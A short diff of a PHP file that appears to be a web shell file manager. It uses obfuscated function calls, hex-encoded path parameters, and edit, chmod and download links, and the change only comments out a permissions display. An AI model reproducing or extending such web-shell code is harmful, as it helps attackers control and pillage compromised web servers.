@@ -846,8 +846,8 @@ if ($_GET['don'] == true) {
                                     } elseif (!is_readable($fungsi[0]() . '/' . $_F)) {
                                         echo '<font color="red">';
                                     }
-                                    echo perms($fungsi[0]() . '/' . $_F);
-                                    ?>
+                            // echo perms($fungsi[0]() . '/' . $_F);
+                        ?>
                                 </td>
                                 <td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_F) ?>" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_F) ?>" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&don=<?= hx($_F) ?>" class="badge-action-download"><i class="fa-solid fa-download"></i></a></td>
                             </tr>
